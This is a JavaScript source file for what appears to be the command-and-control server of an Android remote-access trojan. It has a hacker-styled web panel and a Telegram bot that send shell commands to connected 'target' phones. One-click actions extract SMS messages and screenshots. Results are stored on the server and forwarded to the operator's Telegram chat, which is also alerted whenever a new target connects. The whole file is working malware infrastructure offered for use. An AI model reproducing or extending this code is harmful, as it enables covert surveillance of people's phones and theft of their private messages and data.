// index.js - Master Server (Web Terminal + Smart File Manager + 2-Way Telegram Bot)
require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

// --- File System & Config Setup ---
const FILES_DIR = path.join(__dirname, 'file_manager_data');
const CONFIG_FILE = path.join(__dirname, 'config.json');

if (!fs.existsSync(FILES_DIR)) fs.mkdirSync(FILES_DIR, { recursive: true });

// Load or Init Config (For Telegram Settings)
let appConfig = { tgToken: '', tgChatId: '' };
if (fs.existsSync(CONFIG_FILE)) {
    try { appConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8')); } catch (e) {}
}

// --- Configuration ---
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 5e8 // 500MB max limit
});

app.use(cors());
app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ limit: '500mb', extended: true }));

const connectedDevices = new Map(); 
const pendingCommands = new Map(); 

// Authentication
const authMiddleware = (req, res, next) => {
    const token = req.headers['authorization'] || req.query.token;
    if (process.env.AUTH_TOKEN && token !== process.env.AUTH_TOKEN) {
        return res.status(401).json({ error: 'Unauthorized: Invalid Token' });
    }
    next();
};

// ==================== TELEGRAM BOT 2-WAY INTEGRATION ====================

// 1. Send Message TO Telegram
async function sendTelegram(htmlText) {
    if (!appConfig.tgToken || !appConfig.tgChatId) return;
    try {
        let text = htmlText.length > 3900 ? htmlText.substring(0, 3900) + "\n...[TRUNCATED]" : htmlText;
        await fetch(`https://api.telegram.org/bot${appConfig.tgToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: appConfig.tgChatId, text: text, parse_mode: 'HTML' })
        });
    } catch (err) { console.error("TG Send Error"); }
}

// 2. Receive Messages FROM Telegram (Long Polling)
let lastTgUpdateId = 0;
async function pollTelegram() {
    if (!appConfig.tgToken) return setTimeout(pollTelegram, 3000); // Wait if token not set
    try {
        const res = await fetch(`https://api.telegram.org/bot${appConfig.tgToken}/getUpdates?offset=${lastTgUpdateId + 1}&timeout=20`);
        const data = await res.json();
        if (data.ok && data.result.length > 0) {
            for (let update of data.result) {
                lastTgUpdateId = update.update_id;
                if (update.message && update.message.text) {
                    handleTelegramCommand(update.message.text, update.message.chat.id);
                }
            }
        }
    } catch (e) {} // Ignore timeout/network errors
    setTimeout(pollTelegram, 1000);
}
setTimeout(pollTelegram, 2000); // Start Polling

// 3. Process Telegram Commands
async function handleTelegramCommand(text, chatId) {
    // Security check: Only allow authorized chat
    if (String(chatId) !== String(appConfig.tgChatId)) return;

    if (text === '/start' || text === '/help') {
        return sendTelegram(`🤖 <b>Hacker OS Bot Online</b>\n\nCommands:\n/devices - List active devices\n/cmd &lt;command&gt; - Run cmd on first device\n/cmd &lt;id&gt; &lt;command&gt; - Run on specific device`);
    }

    if (text === '/devices') {
        if (connectedDevices.size === 0) return sendTelegram("❌ No active devices.");
        let list = Array.from(connectedDevices.values()).map(d => `📱 <b>${d.socket.deviceId}</b> (${d.deviceInfo.model})`).join('\n');
        return sendTelegram(`<b>Connected Devices:</b>\n${list}`);
    }

    if (text.startsWith('/cmd ')) {
        if (connectedDevices.size === 0) return sendTelegram("❌ No devices connected to server.");
        
        let parts = text.split(' ');
        parts.shift(); // remove '/cmd'
        let targetId = null;
        let commandToRun = '';

        if (connectedDevices.size === 1 || !connectedDevices.has(parts[0])) {
            // Auto select first device
            targetId = Array.from(connectedDevices.values())[0].socket.deviceId;
            commandToRun = parts.join(' ');
        } else {
            // Specified device ID
            targetId = parts[0];
            parts.shift();
            commandToRun = parts.join(' ');
        }

        sendTelegram(`⏳ <b>Executing via Bot...</b>\nDevice: ${targetId}\nCmd: <code>${commandToRun}</code>`);
        
        const requestId = Date.now() + '-TG';
        const device = connectedDevices.get(targetId);
        
        const timer = setTimeout(() => {
            pendingCommands.delete(requestId);
            sendTelegram(`❌ <b>Timeout:</b> Device did not respond.`);
        }, 60000);

        // Register pending command as coming FROM TELEGRAM
        pendingCommands.set(requestId, { timer, command: commandToRun, deviceId: targetId, fromTelegram: true });
        device.socket.emit('execute_command', { requestId, command: commandToRun });
    }
}

// ==================== FRONTEND UI (WEB) ====================
const webUIHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Core OS Terminal V4</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --neon: #00ff41; --bg: #050505; --panel: #111; --border: #004400; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', Courier, monospace; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        
        nav { display: flex; background: var(--panel); border-bottom: 2px solid var(--border); z-index: 10; }
        nav button { flex: 1; background: transparent; color: #555; border: none; padding: 15px 5px; font-size: 14px; cursor: pointer; text-transform: uppercase; font-weight: bold; transition: 0.3s; }
        nav button.active { color: var(--bg); background: var(--neon); }

        .app-container { flex: 1; display: flex; flex-direction: column; overflow: hidden; padding: 10px; }
        .tab-content { display: none; flex-direction: column; height: 100%; animation: fadeIn 0.3s ease; }
        .tab-content.active { display: flex; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .top-bar { display: flex; gap: 8px; margin-bottom: 10px; flex-wrap: wrap; }
        input, select, button { background: var(--panel); color: var(--neon); border: 1px solid var(--border); padding: 12px; border-radius: 4px; font-size: 14px; outline: none; }
        .btn { background: #002200; cursor: pointer; font-weight: bold; text-transform: uppercase; border: 1px solid var(--neon); transition: 0.2s; }
        .btn:hover { background: var(--neon); color: var(--bg); }
        .btn-danger { background: #300; border-color: #ff3333; color: #ff3333; }
        .flex-1 { flex: 1; min-width: 120px; }

        /* SCROLLING TERMINAL CSS */
        #terminal-output { flex-grow: 1; background: #000; border: 1px solid var(--neon); border-radius: 4px; padding: 15px; overflow-y: auto; overflow-x: hidden; font-size: 13px; white-space: pre-wrap; word-wrap: break-word; margin-bottom: 10px; line-height: 1.5; scroll-behavior: smooth; }
        .input-area { display: flex; background: var(--panel); border: 1px solid var(--neon); border-radius: 4px; }
        .prompt { color: #fff; font-weight: bold; padding: 12px; border-right: 1px solid var(--border); }
        #cmdInput { border: none; background: transparent; flex-grow: 1; padding: 12px; color: var(--neon); width: 100%; }

        /* File Manager & Settings */
        .file-list { flex-grow: 1; overflow-y: auto; border: 1px solid var(--border); background: var(--panel); border-radius: 4px; }
        .file-item { display: flex; justify-content: space-between; align-items: center; padding: 12px; border-bottom: 1px solid var(--border); }
        .file-info { display: flex; align-items: center; gap: 12px; word-break: break-all; }
        
        .settings-card { border: 1px solid var(--border); padding: 20px; border-radius: 4px; background: var(--panel); max-width: 500px; margin: 0 auto; width: 100%; }
        .settings-card label { display: block; margin-bottom: 5px; color: #888; font-size: 12px; text-transform: uppercase;}
        .settings-card input { width: 100%; margin-bottom: 15px; }

        .log-error { color: #ff5555; } .log-success { color: #55ff55; } .log-cmd { color: #00aaff; margin-top: 10px;} .log-data { color: #ccc; }
        
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: var(--bg); }
        ::-webkit-scrollbar-thumb { background: var(--neon); }

        @media (max-width: 600px) {
            nav button { font-size: 11px; padding: 12px 2px; }
            .prompt { padding: 12px 5px; font-size: 12px; }
            .file-item { flex-direction: column; align-items: flex-start; gap: 10px; }
            .file-actions { width: 100%; display: flex; gap: 5px; }
            .file-actions button { flex: 1; }
        }
    </style>
</head>
<body>

    <nav>
        <button id="nav-home" class="active" onclick="switchTab('home')"><i class="fas fa-home"></i> Home</button>
        <button id="nav-terminal" onclick="switchTab('terminal')"><i class="fas fa-terminal"></i> Terminal</button>
        <button id="nav-files" onclick="switchTab('files')"><i class="fas fa-folder"></i> Files</button>
        <button id="nav-settings" onclick="switchTab('settings')"><i class="fas fa-cog"></i> Setup</button>
    </nav>

    <div class="app-container">
        
        <div class="top-bar">
            <input type="password" id="authToken" class="flex-1" placeholder="Auth Token (Auto-saved)">
            <select id="deviceSelect" class="flex-1"><option value="">Select Device...</option></select>
            <button class="btn" onclick="loadDevices()"><i class="fas fa-sync-alt"></i></button>
        </div>

        <div id="tab-home" class="tab-content active">
            <div style="text-align:center; margin-top:30px;">
                <h1 style="font-size: 2rem; text-shadow: 0 0 10px var(--neon);">SYSTEM ACTIVE</h1>
                <p style="color: #666; margin-top: 10px;">Select a device and go to Terminal.</p>
                <div style="margin-top: 30px; display: grid; gap: 10px; max-width: 300px; margin-left: auto; margin-right: auto;">
                    <button class="btn" onclick="quickCmd('ls')">List Files (ls)</button>
                    <button class="btn" onclick="quickCmd('sms > sms.txt')">Extract SMS</button>
                    <button class="btn" onclick="quickCmd('screenshot > screen.png')">Take Screenshot</button>
                </div>
            </div>
        </div>

        <div id="tab-terminal" class="tab-content">
            <div id="terminal-output">Ready... System linked to Telegram Bot.<br></div>
            <div class="input-area">
                <span class="prompt" id="prompt-text">root:~#</span>
                <input type="text" id="cmdInput" placeholder="cmd > file.txt" onkeypress="if(event.key === 'Enter') processInput()" autocomplete="off">
                <button class="btn" onclick="processInput()" style="border:none;"><i class="fas fa-paper-plane"></i></button>
            </div>
        </div>

        <div id="tab-files" class="tab-content">
            <button class="btn" onclick="loadFiles()" style="margin-bottom:10px;">Refresh Files</button>
            <div class="file-list" id="fileList"></div>
        </div>

        <div id="tab-settings" class="tab-content">
            <h2 style="text-align:center; margin-bottom: 20px;">Telegram Bot Config</h2>
            <div class="settings-card">
                <label>Telegram Bot Token</label>
                <input type="text" id="cfgToken" placeholder="e.g. 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11">
                <label>Your Chat ID</label>
                <input type="text" id="cfgChatId" placeholder="e.g. 123456789">
                <button class="btn" onclick="saveConfig()" style="width:100%; margin-top:10px;">Save & Link Bot</button>
                <p style="font-size:11px; color:#555; margin-top:15px; text-align:center;">Once saved, send <b>/start</b> to your bot to test the connection.</p>
            </div>
        </div>

    </div>

    <script>
        const term = document.getElementById('terminal-output');
        const tokenInput = document.getElementById('authToken');
        const deviceSelect = document.getElementById('deviceSelect');

        window.onload = () => {
            if (localStorage.getItem('hackerToken')) {
                tokenInput.value = localStorage.getItem('hackerToken');
                setTimeout(() => { loadDevices(); fetchConfig(); }, 500);
            }
        };

        deviceSelect.addEventListener('change', () => {
            const val = deviceSelect.value;
            document.getElementById('prompt-text').innerText = val ? \`\${val.substring(0,5)}:~#\` : 'root:~#';
        });

        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('nav button').forEach(el => el.classList.remove('active'));
            document.getElementById('tab-' + tabId).classList.add('active');
            document.getElementById('nav-' + tabId).classList.add('active');
            if(tabId === 'files') loadFiles();
            if(tabId === 'settings') fetchConfig();
        }

        function quickCmd(cmd) { switchTab('terminal'); document.getElementById('cmdInput').value = cmd; processInput(); }

        function log(msg, type = 'normal') {
            const div = document.createElement('div');
            div.className = 'log-' + type;
            if (typeof msg === 'object') div.textContent = JSON.stringify(msg, null, 2);
            else div.innerHTML = String(msg).replace(/\\n/g, '<br>');
            term.appendChild(div);
            setTimeout(() => { term.scrollTop = term.scrollHeight; }, 50);
        }

        async function fetchAPI(endpoint, options = {}) {
            const token = tokenInput.value;
            if (token) localStorage.setItem('hackerToken', token);
            const headers = { 'Authorization': token, ...options.headers };
            const res = await fetch(endpoint, { ...options, headers });
            const data = await res.json();
            if (!res.ok || !data.success) throw new Error(data.error || 'Request failed');
            return data;
        }

        // --- Config / Settings Sync ---
        async function fetchConfig() {
            try {
                const data = await fetchAPI('/api/settings');
                document.getElementById('cfgToken').value = data.tgToken || '';
                document.getElementById('cfgChatId').value = data.tgChatId || '';
            } catch(e) {}
        }

        async function saveConfig() {
            try {
                await fetchAPI('/api/settings', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        tgToken: document.getElementById('cfgToken').value.trim(), 
                        tgChatId: document.getElementById('cfgChatId').value.trim() 
                    })
                });
                alert('Telegram config saved! Server is syncing...');
            } catch(e) { alert('Error: ' + e.message); }
        }

        async function loadDevices() {
            try {
                const data = await fetchAPI('/api/devices');
                const prev = deviceSelect.value;
                deviceSelect.innerHTML = '<option value="">Select Device...</option>';
                data.devices.forEach(d => { deviceSelect.innerHTML += \`<option value="\${d.id}">\${d.model} (\${d.id})</option>\`; });
                if(prev) deviceSelect.value = prev;
            } catch (err) {}
        }

        async function processInput() {
            const deviceId = deviceSelect.value;
            const cmdInput = document.getElementById('cmdInput');
            let input = cmdInput.value.trim();
            if (!input) return;
            cmdInput.value = '';

            if (!deviceId) return log('[!] Select a device first.', 'error');

            let saveAs = null;
            if (input.includes(' > ')) {
                const parts = input.split(' > ');
                input = parts[0].trim();
                saveAs = parts[1].trim();
            }

            log('➔ ' + input + (saveAs ? \` (Saving to \${saveAs}...)\` : ''), 'cmd');
            
            try {
                const data = await fetchAPI('/api/command/' + deviceId, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: input, saveAs: saveAs })
                });
                
                let rawResult = data.result;
                if (typeof rawResult === 'string' && rawResult.length > 50000 && saveAs) {
                    log('[Data Received: ' + rawResult.length + ' bytes... Saving binary directly]', 'data');
                } else {
                    log(rawResult || '[No Output]', 'data');
                }
                if(data.savedToFile) log(\`[✔] Saved Successfully: \${saveAs}\`, 'success');

            } catch (err) { log('[!] Error: ' + err.message, 'error'); }
        }

        // --- FILE MANAGER ---
        function formatBytes(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024, sizes = ['B', 'KB', 'MB', 'GB'], i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
        }

        async function loadFiles() {
            const list = document.getElementById('fileList');
            list.innerHTML = '<div style="padding:15px; text-align:center;">Loading...</div>';
            try {
                const data = await fetchAPI('/api/files');
                list.innerHTML = '';
                if(data.files.length === 0) return list.innerHTML = '<div style="padding:15px;text-align:center;color:#555">No files.</div>';
                
                data.files.sort((a,b) => b.mtime - a.mtime).forEach(f => {
                    list.innerHTML += \`
                        <div class="file-item">
                            <div class="file-info">
                                <i class="fas fa-file-alt" style="font-size:20px; color:#00aaff;"></i> 
                                <div><div style="font-weight:bold">\${f.name}</div><div style="font-size:11px; color:#666">\${formatBytes(f.size)}</div></div>
                            </div>
                            <div class="file-actions">
                                <button class="btn" onclick="window.open('/api/files/download/\${f.name}?token=\${tokenInput.value}', '_blank')"><i class="fas fa-eye"></i></button>
                                <button class="btn btn-danger" onclick="deleteFile('\${f.name}')"><i class="fas fa-trash"></i></button>
                            </div>
                        </div>\`;
                });
            } catch(e) { list.innerHTML = 'Error: ' + e.message; }
        }

        async function deleteFile(name) {
            if(!confirm('Delete ' + name + '?')) return;
            try { await fetchAPI('/api/files/delete/' + name, { method: 'DELETE' }); loadFiles(); } catch(e) { alert(e); }
        }
    </script>
</body>
</html>
`;

app.get('/', (req, res) => res.send(webUIHTML));

// ==================== REST API ====================

// --- SETTINGS API ---
app.get('/api/settings', authMiddleware, (req, res) => {
    res.json({ success: true, tgToken: appConfig.tgToken, tgChatId: appConfig.tgChatId });
});

app.post('/api/settings', authMiddleware, (req, res) => {
    appConfig.tgToken = req.body.tgToken || '';
    appConfig.tgChatId = req.body.tgChatId || '';
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(appConfig));
    res.json({ success: true });
});

app.get('/api/devices', authMiddleware, (req, res) => {
    try {
        const devices = Array.from(connectedDevices.values()).map(d => ({ id: d.socket.deviceId, model: d.deviceInfo?.model || 'Android Target' }));
        res.json({ success: true, devices });
    } catch (error) { res.status(500).json({ success: false, error: error.message }); }
});

// Helper for saving files (Used by both Web and Telegram)
function saveToFileSystem(saveAs, result) {
    const safeName = path.basename(saveAs); 
    const filePath = path.join(FILES_DIR, safeName);
    const isBinary = safeName.match(/\.(png|jpg|jpeg|apk)$/i);

    if (isBinary && typeof result === 'string') {
        let base64Data = result.replace(/^data:.*?;base64,/, ""); 
        if (/^[A-Za-z0-9+/=\s]+$/.test(base64Data)) {
            fs.writeFileSync(filePath, Buffer.from(base64Data, 'base64'));
        } else {
            fs.writeFileSync(filePath, result);
        }
    } else {
        let dataToWrite = typeof result === 'object' ? JSON.stringify(result, null, 2) : String(result);
        fs.writeFileSync(filePath, dataToWrite, 'utf8');
    }
    return safeName;
}

// Web Command Execution Route
app.post('/api/command/:deviceId', authMiddleware, async (req, res) => {
    const { deviceId } = req.params;
    const { command, saveAs } = req.body;

    const device = connectedDevices.get(deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Device offline' });

    const requestId = Date.now() + '-WEB';
    const commandPromise = new Promise((resolve, reject) => {
        const timer = setTimeout(() => { pendingCommands.delete(requestId); reject(new Error('Device timeout.')); }, 60000); 
        pendingCommands.set(requestId, { resolve, reject, timer, command, deviceId, saveAs }); 
    });

    try {
        device.socket.emit('execute_command', { requestId, command });
        let result = await commandPromise; 

        if (saveAs) {
            let savedName = saveToFileSystem(saveAs, result);
            return res.json({ success: true, requestId, result: result, savedToFile: true, file: savedName });
        }
        res.json({ success: true, requestId, result });
    } catch (error) { res.status(500).json({ success: false, error: error.message }); }
});

// File Manager Routes
app.get('/api/files', authMiddleware, (req, res) => {
    try {
        const files = fs.readdirSync(FILES_DIR).map(name => {
            const stats = fs.statSync(path.join(FILES_DIR, name));
            return { name, size: stats.size, mtime: stats.mtimeMs }; 
        });
        res.json({ success: true, files });
    } catch (error) { res.status(500).json({ success: false, error: error.message }); }
});
app.get('/api/files/download/:name', authMiddleware, (req, res) => {
    const filePath = path.join(FILES_DIR, path.basename(req.params.name));
    if (fs.existsSync(filePath)) res.sendFile(filePath); else res.status(404).send('Missing file.');
});
app.delete('/api/files/delete/:name', authMiddleware, (req, res) => {
    const filePath = path.join(FILES_DIR, path.basename(req.params.name));
    if (fs.existsSync(filePath)) { fs.unlinkSync(filePath); res.json({ success: true }); }
    else res.status(404).json({ success: false, error: 'Not found' });
});

// ==================== SOCKET.IO CENTRAL HANDLER ====================
io.on('connection', (socket) => {
    socket.on('register_device', (data) => {
        const { deviceId, deviceInfo } = data;
        if (!deviceId) return;
        socket.deviceId = deviceId;
        socket.deviceInfo = deviceInfo || { model: 'Unknown' };
        connectedDevices.set(deviceId, { socket, deviceInfo });
        socket.join('device:' + deviceId);
        
        sendTelegram(`📱 <b>New Target Connected!</b>\nID: <code>${deviceId}</code>\nModel: ${socket.deviceInfo.model}`);
        socket.emit('registered', { success: true });
    });

    socket.on('command_response', (data) => {
        const { requestId, success, result, error } = data;
        const pending = pendingCommands.get(requestId);
        if (pending) {
            clearTimeout(pending.timer);
            pendingCommands.delete(requestId);

            // Handle Web Promises
            if (pending.resolve) {
                if (success) pending.resolve(result);
                else pending.reject(new Error(error || 'Failed.'));
            }

            // --- ALL TELEGRAM LOGGING & SAVING HAPPENS HERE ---
            let shortRes = typeof result === 'object' ? JSON.stringify(result).substring(0, 500) : String(result).substring(0, 500);
            
            // If the command was initiated via Telegram bot OR it was a Web command
            if (pending.fromTelegram) {
                // If the Telegram user used "> file.txt" syntax
                let tgSaveAs = null;
                if (pending.command.includes(' > ')) {
                    tgSaveAs = pending.command.split(' > ')[1].trim();
                }

                if (success) {
                    if (tgSaveAs) {
                        saveToFileSystem(tgSaveAs, result);
                        sendTelegram(`✅ <b>Cmd Success</b>\nOutput saved to File Manager as <b>${tgSaveAs}</b>`);
                    } else {
                        sendTelegram(`✅ <b>Cmd Success</b>\n<code>${pending.command}</code>\n\n<pre>${shortRes}</pre>`);
                    }
                } else {
                    sendTelegram(`❌ <b>Cmd Failed</b>\n<code>${pending.command}</code>\n\nError: ${error}`);
                }
            } else {
                // Was initiated from Web Web UI, just log short result to Telegram
                if (success) sendTelegram(`🌐 <b>Web Command Executed</b>\nCmd: <code>${pending.command}</code>\nDevice: ${pending.deviceId}\n\n<pre>${shortRes}</pre>`);
            }
        }
    });

    socket.on('disconnect', () => {
        if (socket.deviceId) {
            connectedDevices.delete(socket.deviceId);
            sendTelegram(`⚠️ <b>Target Offline</b>\nID: <code>${socket.deviceId}</code>`);
        }
    });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, '0.0.0.0', () => {
    console.log("🚀 V4 Master Server Live on Port " + PORT);
});
